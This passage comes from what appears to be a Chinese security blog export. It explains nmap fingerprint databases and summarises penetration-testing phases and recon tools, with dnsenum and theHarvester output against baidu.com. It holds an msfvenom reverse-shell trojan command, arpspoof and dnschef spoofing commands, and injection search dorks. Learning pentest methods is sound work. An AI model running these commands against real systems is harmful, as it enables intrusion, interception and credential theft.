([\w_-]+).*\x0fProviderVersion\t..(\d[\w._-]*)|s p/ActiveMQ OpenWire transport/ v/$4/ i/Java $1; arch: $3/ o/Linux $2/ cpe:/a:apache:activemq:$4/ cpe:/o:linux:linux_kernel:$2/asoftmatch apachemq m|^\0\0..\x01ActiveMQ\0| p/ActiveMQ OpenWire transport/ 我们可以看到，发送了一个NULL探针，正则匹配相应的banner内容来确定服务 操作系统检测查看nmap-os-db，内容如下，截取了一段，好像….有点难读: 1234567891011121314151617181920212223242526272829303132333435# Acorp-W422G, wireless ADSL router.# Linux 2.4.17_mvl21-malta-mips_fp_le (root@home1.homework) (gcc version 2.95.3 20010315 (release/MontaVista)) #1 Sat Sep 8 00:03:33 MSD 2007, Acorp-W400G ADSL and Wi-Fi router,Fingerprint Acorp W400G or W422G wireless ADSL modem (MontaVista embedded Linux 2.4.17)Class Acorp | embedded || WAPSEQ(SP=C2-CC%GCD=1-6%ISR=C7-D1%TI=Z%II=I%TS=7)OPS(O1=M5B4ST11%O2=M5B4ST11%O3=M5B4NNT11%O4=M5B4ST11%O5=M5B4ST11%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=3B-45%TG=40%W=16D0%O=M5B4NNS%CC=N%Q=)T1(R=Y%DF=Y%T=3B-45%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=FA-104%TG=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(DF=N%T=FA-104%TG=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(DFI=N%T=FA-104%TG=FF%CD=S)# This is a GT701, which is issued by QWEST.Fingerprint Actiontec GT701 DSL modemClass Actiontec | embedded || broadband routerCPE cpe:/h:actiontec:gt701 autoSEQ(SP=C8-D2%GCD=1-6%ISR=CC-D6%TI=Z%II=I%TS=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=3B-45%TG=40%W=16D0%O=M5B4NNSNW0%CC=Y%Q=)T1(R=Y%DF=Y%T=3B-45%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=FA-104%TG=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(DF=N%T=FA-104%TG=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(DFI=N%T=FA-104%TG=FF%CD=S) 根据注释可以看到第一个是linux以及一些分类信息，下面的就是特征数据. 每一行都是一项测试的结果，其中 XXX() 中的 XXX 是测试的名字(例如SEQ、OPS测试)。括号内以 % 分隔的各项是测试中的各种指标。每项指标的值都是key-value形式. 所有的测试分成五组， 12345第一组测试包含 SEQ、OPS、WIN、T1。这项测试会发送六个 TCP 包，然后检查响应的各种细节。第二组测试是 IE，会发送两个不同的 ICMP echo 请求，检测其响应特征。第三组测试是 U1，发送一个 UDP 包给一个关闭的端口，然后看下 ICMP 的 port unreachable 回复。第四组测试是 ECN，全称是 Explicit Congestion Notification，即“显式拥塞通知”。该测试会发送带 ECN 位的 TCP 请求，比较其响应。最后一组是发送六个不同的 TCP 包，这六个 TCP 包的响应结果将对应T2到T7的各项指标，其中 T2-T4 会发给打开的 TCP 端口，T5-T7 会发给关闭的 TCP 端口。]]></content>
      <categories>
        <category>scanning</category>
      </categories>
      <tags>
        <tag>scanning</tag>
        <tag>network security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试相关总结]]></title>
    <url>%2Fblog%2Fpenetration-testing%2F</url>
    <content type="text"><![CDATA[首先上张图，内容为常见的渗透测试攻击检测内容： 当然，还有PTES(Penetration Testing Execution Standard) 渗透测试执行标准，可以去PTES官网看详细内容 这里提供一个翻译版的图表内容PTES标准 渗透测试部分总结最后更新于 2018.01.15 PTES 渗透测试执行标准渗透测试执行标准PTES一般分为一下7个阶段： 前期交互 阶段 前期交互阶段通常是由你与客户组织进行讨论，来确定渗透测试的范围和目标。这个阶段最为关键的是需要让客户组织明确清晰地了解渗透测试将设计哪些目标 情报收集 阶段 在情报收集阶段，你需要采用各种可能的方法来收集将要攻击的客户组织的所有信息，包括使用社交mentioned网络、Google Hacking技术、目标系统踩点等等。 威胁建模 阶段 威胁建木主要使用你在情报搜集阶段所获取到的信息，来标识出目标系统上可能存在的安全漏洞与弱点。在进行威胁建模时，你将确定最为高校的攻击方法、你所需要进一步获取到的信息，以及从哪里攻破目标系统。在威胁建模阶段，你通常需要将客户组织作为敌手看待，然后以攻击者的视角和思维来尝试利用目标系统的弱点。 漏洞分析 阶段 一旦确定最为可行的攻击方法之后，你需要考虑你该如何取得目标系统的访问权。在漏洞分析极端，你将综合从前面几个环节中获取到的信息，并从中分析和理解哪些攻击途径会是可行的。特别需要重点分析端口和漏洞扫描结果，攫取到的服务“旗帜”信息，以及在情报收集环节中得到的其他关键信息。 渗透攻击 阶段 最好是在你基本上能够确信特定渗透攻击会成功的时候，才真正对目标系统实施这次渗透攻击，当然在目标系统中可能存在着一些你没有预期到的安全防护措施，使得这次渗透攻击无法成功。但是要记住的是，在你尝试要出发一个漏洞时，你应该清晰的了解目标系统存在这个漏洞，进行大量漫无目的的渗透尝试之后期待奇迹般地出现一个shell根本是痴心妄想。 后渗透攻击 阶段 后渗透攻击节段从你已经攻陷了客户组织的一些系统或取得域管理权限之后开始 在后渗透测试阶段中，就需要你在这些难以处理的场景中寻找可用信息，激发灵感，并达成你所设置的攻击目标，从攻击者的角度，一个普通攻击者往往在攻陷系统后将他的大部分时间用于千篇一律的操作，然而作为一名这也的渗透测试者，你需要想恶意攻击者那样去思考，具有创新意识，能够迅速的反应，并依赖于你的智慧和经验，而不是使用那些自动化的攻击工具。 报告阶段 报告是渗透测试过程中最为重要的因素，你将使用报告文档来交流你在渗透测试过程中做了哪些，如何做的，以及最为重要的——客户组织如何修复你所发现的安全漏洞与弱点。报告至少应该分为摘要、过程演示和技术发现这几个部分。 渗透测试以下总结渗透测试的常见步骤和相应工具，持续更新. 范围界定 确定需求 整体项目时间 测试 IP 和 域名 范围 可接受的社会工程学方法 渗透测试的具体类型（黑盒、白盒、内部、外部、是否进行DoS攻击） 网络设备类型（防火墙、路由器、交换机、调制解调器、负载平衡器、IDS、IPS，还是其他类型的硬件设备） 组织结构关系 预算概要 交付成果的具体类型 确定测试流程 解决人员配置 成本分析 保密协议 渗透测试合同 操作规则 信息收集域名信息用于收集域名或IP地址范围，常见方法如下： Google Hacking / Google Dorks whois / whois反查 子域名收集- subDomainsBrute/Layer # Google Hacking / Google Dorks使用搜索引擎来进行信息收集，往往能搜到很多有用的信息，当然也是一个非常靠技巧的事情。以下举一些简单的例子: 12345678910最简单sql注入点搜索:inurl:php?id=针对某个域名搜索相关信息site:xxx.comsite:xxx.com intitle:"admin login"site:xxx.com filetype:doc intext:pass查看某个域名的url中是否有某些页面(有些框架的通用漏洞在多个网站中都会存在)site:xxx.com inurl:admin.php 当然，对于新手来说不知道去搜索些什么，可以看Google Dorks 里面提供了很多搜索的内容，可以供新手学习思路或直接使用，其对于payload已经分好类。 # whoisWHOIS是一个标准的互联网协议，可用于收集网络注册、注册域名、IP地址和自治系统的信息。Linux 带有whois客户端程序whois，一般可直接运行。 12345678910111213141516171819 whois hellohxk.com Domain Name: HELLOHXK.COM Registry Domain ID: 2083889348_DOMAIN_COM-VRSN Registrar WHOIS Server: grs-whois.hichina.com Registrar URL: http://www.net.cn Updated Date: 2017-12-21T03:03:06Z Creation Date: 2016-12-22T04:24:38Z Registry Expiry Date: 2018-12-22T04:24:38Z Registrar: HiChina Zhicheng Technology Ltd. Registrar IANA ID: 420 Registrar Abuse Contact Email: DomainAbuse@service.aliyun.com Registrar Abuse Contact Phone: +86.95187 Domain Status: ok https://icann.org/epp#ok Name Server: DNS15.HICHINA.COM Name Server: DNS16.HICHINA.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2018-02-23T12:34:09Z &lt;&lt;&lt; 可以看到显示的是阿里云的联系方式，这是因为我域名是在阿里云买的，同时选择了域名隐私保护。一些没有使用隐私保护的网站或者非VPS会显示其相关注册人的个人信息。 当然也可以通过各种域名服务提供商进行查询，不过一般其只显示自己家的域名信息。 www.whois.net www.internic.net/whois.html www.arin.net/whois/ www.db.ripe.net/whois www.apnic.net/apnic-info/whois_search2 # whois反查有时候，同一个人往往使用同一个邮箱或电话来注册域名，我们想获取相关的信息，就是whois反查。 举个例子，我们使用站长之家的邮箱反查去查询我们上面的阿里云邮箱: # 子域名收集 subDomainsBrute Layer 两款子域名猜解的工具，其原理都是使用枚举，所使用的规则或字典越强大，更可能发现更多的有效子域名。kali linux自带的dnsenum附加了常见域名的字典，dns-big字典我放在了github上 IP地址信息 host / dig dnsenmu dnsdict6 DMitry tcptraceroute DNS-Zone-Transfer # host / dighost host is a simple utility for performing DNS lookups. 1234567891011121314host -v www.meishichina.comTrying "www.meishichina.com";; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39349;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 0;; QUESTION SECTION:;www.meishichina.com. IN A;; ANSWER SECTION:www.meishichina.com. 319 IN CNAME www.meishichina.com.w.kunlunar.com.www.meishichina.com.w.kunlunar.com. 269 IN A 125.76.247.169...... host也可完成DNS zone transfer使用如下命令： 1host -l xx.com dns.xx.com 如果DNS服务器配置不当，就有可能造成这样的攻击，不过现代一般都将这个功能关闭了。关于DNS域传送漏洞，会在后面提到。 dig比较常用的工具，灵活且强大 dig (domain information groper) is a flexible tool for interrogating DNS name servers. It performs DNS lookups and displays the answers that are returned from the name server(s) that were queried. Most DNS administrators use dig to troubleshoot DNS problems because of its flexibility, ease of use and clarity of output. Other lookup tools tend to have less functionality than dig. 1234567891011121314151617dig hellohxk.com; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; hellohxk.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 43214;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 16;; QUESTION SECTION:;hellohxk.com. IN A;; ANSWER SECTION:hellohxk.com. 49 IN A 103.72.145.7;; AUTHORITY SECTION:hellohxk.com. 85758 IN NS dns15.hichina.com.hellohxk.com. 85758 IN NS dns16.hichina.com. 常见的记录类型如下: A记录 实现 domain name =&gt; IP addr 12345678910nslookup -querytype=a hellohxk.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:Name: hellohxk.comAddress: 103.72.145.7Non-authoritative answer: 它的出现代表这个结果是从服务器的缓存中得到的，这不是一个授权的答案。 如果同一个域名指向多个A记录 每次返回的数据包含了两个IP地址，但是在返回的过程中数据排列的顺序每次都不相同。 由于大部分的客户端只选择第一条记录所以通过这种方式可以实现一定程度的负载均衡。 MX记录 实现 Mail服务 12345678nslookup -querytype=mx hellohxk.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:hellohxk.com mail exchanger = 10 mxw.mxhichina.com.hellohxk.com mail exchanger = 5 mxn.mxhichina.com. 即在给mail@xx.com发邮件时，会去进行域名解析，查找MX记录。 先找权重数最小的服务器（比如说是 10），如果能连通，那么就将服务器发送过去；如果无法连通 mx记录为10 的服务器，那么才将邮件发送到权重为20的 mail 服务器上。 权重20的服务器在配置上只是暂时缓存mail ，当权重20的服务器能连通权重为10的服务器时，仍会将邮件发送的权重为10的 Mail 服务器上。当然，这个机制需要在 Mail 服务器上配置。 CNAME记录 实现 域名别称的作用 123456nslookup -querytype=cname www.meishichina.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:www.meishichina.com canonical name = www.meishichina.com.w.kunlunar.com. 当我们要指向很多的域名到一台电脑上的时候，用CNAME比较方便，这样查出来的不一定是真正的信息，比如baidu查出来就是a.shifen.com是baidu的安全外壳。 TXT记录 实现 某条记录设置说明 1nslookup -qt=txt example.com 如果设置了内容，就会看到结果 AAAA 记录 指向 IPv6地址 NS记录 指向 用哪台DNS服务器进行解析 TTL值 表示 解析记录在DNS服务器中的缓存时间, 利用这个值可以实现DNS rebinding，具体利用可以参考这里 同样，dig也可进行DNS域传送: 1dig @ns4.isp.com example.com axfr # dnsenumDNS 枚举程序 通过字典进行DNS子域名枚举，你也可以提供你自己的字典，以baidu为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104nyrae@nyrae:~$ dnsenum -f /home/nyrae/hxk/dns_subdomain_bruteforce/dns-big.txt baidu.comSmartmatch is experimental at /usr/bin/dnsenum line 698.Smartmatch is experimental at /usr/bin/dnsenum line 698.dnsenum VERSION:1.2.4----- baidu.com -----Host's addresses:__________________baidu.com. 197 IN A 123.125.114.144baidu.com. 197 IN A 220.181.57.216baidu.com. 197 IN A 111.13.101.208Wildcard detection using: bmfbzcfqczrk_______________________________________bmfbzcfqczrk.baidu.com. 200 IN A 116.255.235.199!!!!!!!!!!!!!!!!!!!!!!!!!!!! Wildcards detected, all subdomains will point to the same IP address Omitting results containing 116.255.235.199. Maybe you are using OpenDNS servers.!!!!!!!!!!!!!!!!!!!!!!!!!!!!Name Servers:______________dns.baidu.com. 61918 IN A 202.108.22.220ns2.baidu.com. 75478 IN A 61.135.165.235ns3.baidu.com. 61918 IN A 220.181.37.10ns4.baidu.com. 61918 IN A 220.181.38.10ns7.baidu.com. 62539 IN A 180.76.76.92Mail (MX) Servers:___________________mx.maillb.baidu.com. 95 IN A 220.181.50.185mx.n.shifen.com. 95 IN A 220.181.3.85mx1.baidu.com. 95 IN A 220.181.50.185mx1.baidu.com. 95 IN A 61.135.165.120jpmx.baidu.com. 1640 IN A 61.208.132.13mx50.baidu.com. 70 IN A 180.76.13.18Trying Zone Transfers and getting Bind Versions:_________________________________________________Trying Zone Transfer for baidu.com on ns2.baidu.com ...AXFR record query failed: REFUSEDTrying Zone Transfer for baidu.com on ns3.baidu.com ...AXFR record query failed: REFUSEDTrying Zone Transfer for baidu.com on ns7.baidu.com ...AXFR record query failed: REFUSEDTrying Zone Transfer for baidu.com on ns4.baidu.com ...AXFR record query failed: REFUSEDTrying Zone Transfer for baidu.com on dns.baidu.com ...AXFR record query failed: REFUSEDBrute forcing with /home/nyrae/hxk/dns_subdomain_bruteforce/dns-big.txt:_________________________________________________________________________1.baidu.com. 600 IN CNAME baifubao-bfe.n.shifen.com.baifubao-bfe.n.shifen.com. 291 IN A 180.149.133.12511.baidu.com. 600 IN CNAME jpaasmatrix.e.shifen.com.jpaasmatrix.e.shifen.com. 300 IN A 220.181.57.557.baidu.com. 600 IN CNAME developers.n.shifen.com.999.baidu.com. 7200 IN CNAME domain-offline.baidu.com.domain-offline.baidu.com. 422 IN A 182.61.62.50a.baidu.com. 968 IN CNAME asp.e.shifen.com.asp.e.shifen.com. 60 IN A 220.181.57.146abc.baidu.com. 150 IN CNAME www.a.shifen.com.www.a.shifen.com. 79 IN A 180.149.131.98www.a.shifen.com. 79 IN A 180.149.132.151abs.baidu.com. 7200 IN CNAME abs.n.shifen.com.abs.n.shifen.com. 300 IN A 180.149.144.4ac.baidu.com. 5192 IN CNAME ac.n.shifen.com.ac.n.shifen.com. 206 IN A 180.97.104.203acc.baidu.com. 7200 IN A 10.48.46.62access.baidu.com. 7200 IN A 10.94.49.39accounts.baidu.com. 7200 IN A 10.11.252.74ad.baidu.com. 7200 IN CNAME domain-offline.baidu.com.domain-offline.baidu.com. 388 IN A 182.61.62.50ada.baidu.com. 39 IN CNAME ada.e.shifen.com.ada.e.shifen.com. 242 IN A 180.149.132.130adm.baidu.com. 3399 IN CNAME ssp.bfe.e.shifen.com.ssp.bfe.e.shifen.com. 21 IN A 180.149.131.210admin.baidu.com. 7200 IN A 10.26.109.19ads.baidu.com. 7200 IN A 10.42.4.225^C 可以看到他将NS和MX也都帮你查找了出来。我们可以使用多个工具进行探测，如果一个结果在多个工具中重复出现，那么那个结果往往是正确的。 # dnsdict6用于IPv6的域名收集，kali2.0 之后默认不附带此工具这些工具的使用基本大同小异。 # DMitry属于多功能的信息收集工具，主要方式为： 根据IP 地址（或域名）来査询目标主机的whois 信息； 在Netcraft.com 的网站上挖掘主机信息； 査找目标域中用的子域； 査找目标域的电子邮件地址； 探测目标主机上打开的端口、被屏蔽的端口和关闭的端口。 dmitry -h的说明写的很详细，通过简单命令可以将一些其他工具的功能一起完成输出。 123dmitry -iwnse baidu.com输出太多，就不贴了 注意其子域名收集会用的google，大天朝人民注意科学上网。 # tcptraceroute用来追踪到目标主机之间的路由信息，与传统的traceroute不同，不使用ICMP数据包而采用TCP SYN包，防止目标过滤ICMP数据包. 12345678910111213141516nyrae@nyrae:~$ tcptraceroute www.baidu.comSelected device eth0, address 10.170.30.165, port 45447 for outgoing packetsTracing the path to www.baidu.com (220.181.112.244) on TCP port 80 (http), 30 hops max 1 10.170.72.254 0.929 ms 0.861 ms 0.851 ms 2 172.16.255.242 4.295 ms 4.462 ms 4.799 ms 3 172.16.255.254 0.981 ms 0.588 ms 0.603 ms 4 113.140.29.1 1.400 ms 1.566 ms 1.974 ms 5 * * * 6 * * * 7 * * * 8 36.110.244.18 23.818 ms 22.517 ms 22.827 ms 9 * * *10 220.181.182.30 20.148 ms 20.129 ms 20.119 ms11 * * *12 220.181.112.244 [open] 21.946 ms 23.013 ms 32.110 ms # DNS-Zone-TransferDNS域传送，其利用的是DNS服务器的冗余设计造成的缺陷,即备用服务器使用来自主服务器的数据刷新自己的域数据库，防止服务器故障时无法提供解析服务。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送. 其他信息收集方法 theharvester Metagoofil # theharvester捜索引擎类工具可以使用搜索引擎获取目标主机的域名信息、电子邮件信息，以及文件的元数据（metadata）信息。这些工具被动收集的工作方式也正是它们的优势所在。如果您无法访问目标主机上的网站，不妨利用搜索引擎间接访问。就其结果而言，目标主机不会知道您具体进行了哪些操作。 theharvester能够收集电子邮件账号、用户名和主机名/子域名信息。它通过数个公共资源搜索所需的信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647python theHarvester.py -d baidu.com -l 100 -b google******************************************************************** ** | |_| |__ ___ /\ /\__ _ _ ____ _____ ___| |_ ___ _ __ ** | __| '_ \ / _ \ / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| ** | |_| | | | __/ / __ / (_| | | \ V / __/\__ \ || __/ | ** \__|_| |_|\___| \/ /_/ \__,_|_| \_/ \___||___/\__\___|_| ** ** TheHarvester Ver. 2.7 ** Coded by Christian Martorella ** Edge-Security Research ** cmartorella@edge-security.com ********************************************************************[-] Searching in Google: Searching 0 results... Searching 100 results...[+] Emails found:------------------ir@baidu.comchuanke-service@baidu.com[+] Hosts found in search engines:------------------------------------[-] Resolving hostnames IPs...111.206.37.70:Pan.baidu.com119.63.197.151:Www.baidu.com103.235.46.232:baike.baidu.com111.206.223.168:d.pcs.baidu.com111.206.37.147:echarts.baidu.com103.235.46.58:fanyi.baidu.com119.146.74.48:imgsrc.baidu.com23.219.39.113:ir.baidu.com119.63.197.139:m.baidu.com103.235.46.122:news.baidu.com111.206.37.70:pan.baidu.com180.76.76.76:public-dns-a.baidu.com103.235.46.140:tieba.baidu.com107.180.84.128:usa.baidu.com103.235.46.250:wappass.baidu.com119.63.197.151:www.baidu.com123.125.112.68:yangziseo.baijia.baidu.com103.235.46.123:zhidao.baidu.com # MetagoofilMetagoofil通过谷歌引擎搜索目标域的文件的元数据信息（metadata）. 12345678910111213在获取元数据信息时，Metagoofil的内部操作过程大体如下：● 使用Google 引擎在目标域内搜索指定的文件类型；● 把搜索到的文档保存到本地磁盘；● 从下载的文件中解析元数据信息；● 把元数据信息的分析结果保存为HTML 文件。我们可以在元数据信息里找到的信息有：● 用户名；● 软件版本；● 服务器名或机器名。渗透测试的后期阶段可能会用到这些信息。 判断是否为真实IP地址由于很多大型网站都存在CDN、保护外壳等内容，我们直接访问所得到的第一个IP地址往往不是我们最终目标的IP地址，以下总结一些判断我们获取的IP地址是否为真实IP的方法。 ping检测 修改host 抓包观察 nslookup 查询域名其他记录 通过邮件、图片获得 # ping检测ping检测可以帮助我们使用多个节点ping目标主机，我们观察其响应IP即可看出是否有CDN。 同样，使用国外ping检测同样达到效果，而且可能更好，因为很多网站对国外访问并没有设置CDN。这里提供一个网站 # 修改host修改host文件： 123/etc/resolv.conf或C:\Windows\System32\drivers\etc 将域名和IP地址进行绑定，如果能够访问，就是真实IP地址。 # 抓包观察抓包观察IP地址，使用telnet去连接相应端口，如果返回html则为真实IP # nslookup1nslookup xxx.com 国外冷门DNS 使用国外冷门DNS，很多网站对于国内才设置CDN。 # 查询域名其他记录有时候A记录看不出来，通过其他NS、TXT、MX记录可能指向真实IP # 通过邮件、图片获得有时服务器会调用sendmail，注册之后，会主动发一封邮件，查看来源IP或者图片上传的地方，抓包分析得到真实IP 活跃主机识别得到IP地址范围后，将进行网络中目标发现，识别主机。 ping/ping6/arping fping hping3/nping # ping/ping6/arpingping，最基本的发送ICMP包探测主机，不过一般服务器进行了这个。ping6用于给ipv6地址发送。arping工作在数据链路层，arp数据包无法穿过路由，所以只能在同一局域网中进行。 # fping与ping 程序相比，fping 可以同时向多个主机发送ping（ICMP echo）请求。您可以在命令行中指定多个目标主机，也可以在某个文件里指定需要被检测的主机。 1fping -g 192.168.56.0/24 # hping3/nping这两个工具都允许用户发送除了ICMP包之外的TCP、UDP、ARP包，同时允许用户自定义发送内容及发送端口，当然习惯上大家更喜欢使用更为强大且常用的Nmap工具，在之后会介绍。 操作系统识别 p0f # p0fp0f是一款百分之百的被动指纹识别工具,该工具通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别。可以使用其分析wireshark抓的数据包: 1p0f -r /tmp/targethost.pcap -o p0f-result.log 服务枚举 Amap #AmapAmap是一个服务枚举工具。使用该工具能识别正运行在一个指定端口或一个范围端口上的应用程序。从下面的输出结果的第二段内容中可以了解到主机192.168.41.136使用的是Red Hat操作系统，并且正在运行着版本为2.2.15的Apache服务器，其开放的端口是80。从倒数第二行信息中可以看到该主机还运行了DNS服务器，其开放的端口是53。 1234567root@kali:~# amap -bq 192.168.41.136 50-100amap v5.4 (www.thc.org/thc-amap) started at 2014-04-21 11:20:36 - APPLICATION MAPPING modeProtocol on 192.168.41.136:80/tcp matches http - banner: &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;501 Method Not Implemented&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Method Not Implemented&lt;/h1&gt;\n&lt;p&gt; to / not supported.&lt;br /&gt;\n&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.2.15 (Red Hat) Server at www.benet.cProtocol on 192.168.41.136:80/tcp matches http-apache-2 - banner: &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;501 Method Not Implemented&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Method Not Implemented&lt;/h1&gt;\n&lt;p&gt; to / not supported.&lt;br /&gt;\n&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.2.15 (Red Hat) Server at www.benet.cProtocol on 192.168.41.136:53/tcp matches dns - banner: \famap v5.4 finished at 2014-04-21 11:20:48 端口扫描 Nmap # NmapNmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具 nmap的说明可以通过man nmap来进行查看。 以下为一些参数例子: 12345对多个目标执行默认参数扫描：nmap scanme.nmap.org 192.168.0.0/8 10.0.0,1,3-7.0-255随机地找一些网站浏览:nmap -sS -PS80 -iR 0 -p 80 更多的参数及使用方法可以看手册或者看我的这篇文章，对常用参数做了总结。 漏洞扫描常见自动化扫描工具 Nessus openVAS AWVS appscan 具体使用就不在这里介绍了，使用起来都比较简单，重要的是规则的设置。 漏洞利用 Metasploit metasploit-framework渗透测试框架，是最为常用的漏洞利用工具，其内置了很多exploit以供使用，一般的流程是这样： 使用漏洞扫描工具对target进行漏洞扫描，metasploit内置了nessus，但个人更喜欢用web版 根据漏洞信息查询相关信息，比较简单的漏洞如弱口令、后门可以直接利用，其他exploit如果内置了可以找到相关模块进行运行，如果没有内置，有CVE编号或其他信息，可以去https://www.exploit-db.com/数据库查找，下载exploit 使用metasploit加载exploit或直接运行得到shell metasploit v4.0之后getshell之后会有meterpreter(有就进行用),其是后渗透测试的利器。 msfvenom 用于生成木马，目标一旦执行，攻击者便可以连接目标。例如: 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b `\x00` LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe 后渗透测试 权限提升 内网渗透 数据获取 日志清除 权限提升权限提升就是将某个用户原来拥有的最低权限提高到最高。因为我们所获得的shell一般不是root，而很多操作需要root/system账户才能执行。权限提升大致有以下方法: 利用本地漏洞 密码攻击 网络欺骗攻击 网络嗅探 使用假冒令牌 使用社会工程学工具包 # 利用本地漏洞取得shell之后，通常分析其内核版本，寻找提升权限的exploit，或根据自身所开放服务，进行测试。没有通用的方案，需要视情况而定。 # 密码攻击构成身份验证的要素可分为三大类： 基于所知(只有特定秘密的持有人才能“知道”有关秘密) / 密码 基于所有(持有者即可获得登录权) / 令牌 基于特征 / 指纹识别和视网膜识别 目前多数系统广泛依赖单一的密码验证 一般密码在系统中均以hash存储 离线哈希破解 识别hash类型 (hash-identifier) hash破解(hashcat) 利用彩虹表(rtgen、rtsort、rcarack) 其他有用工具 samdump2 windows密码哈希破解(win下密码在c:\windows\system32\config中，系统运行时会被锁定，无法查看) john DES和crypt型哈希 # 网络欺骗攻击网络欺骗泛指修改网络数据的各种手段。例如，伪造MAC 地址、伪造IP地址等的数据，都属于网络欺骗的范畴。 DNSChef DNS代理工具。它可替DNS服务器对被测主机进行DNS回复，把域名解析为攻击者管控的IP，从而让攻击者的主机扮演真正的服务器的角色。DNSChef的这种功能可用来分析甚至控制客户主机的网络流量。 1dnschef --fakeip=192.168.2.21 --fakedomains google.com 前提: 目标主机的DNS服务器为DNSChef的主机 arpspoofarp欺骗/arp中间人攻击 1234561.1为网关1.2为测试主机1.3为目标主机arpspoof -t 192.168.1.3 192.168.1.1arpspoof -t 192.168.1.1 192.168.1.3 然后开启IP转发，即完成中间人代理，这样所有流量都会通过192.168.1.2进行数据转发。 Ettercap当arp欺骗成功后，其可以修改数据连接，截获FTP、HTTP、POP和SSH1等协议的密码。 # 网络嗅探Dsniff Dsniff 能够在网络中捕获密码。目前，它可从以下协议中捕获密码：FTP、Telnet、SMTP、HTTP、POP、poppass、NNTP、IMAP、SNMP、LDAP、Rlogin、RIP、OSPF、PPTP MS-CHAP、NFS、VRRP、YP/NIS、SOCKS、X11、CVS、IRC、AIM、ICQ、 Napster、PostgreSQL、Meeting Maker、Citrix ICA、Symantec pcAnywhere、NAI Sniffer、Microsoft SMB、Oracle SQL*Net、Sybase 以及Microsoft SQL tcpdump/wireshark抓取网络数据包进行离线分析。]]></content>
      <categories>
        <category>penetration testing</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>penetration testing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见逻辑漏洞总结]]></title>
    <url>%2Fblog%2Flogical-vulnerability%2F</url>
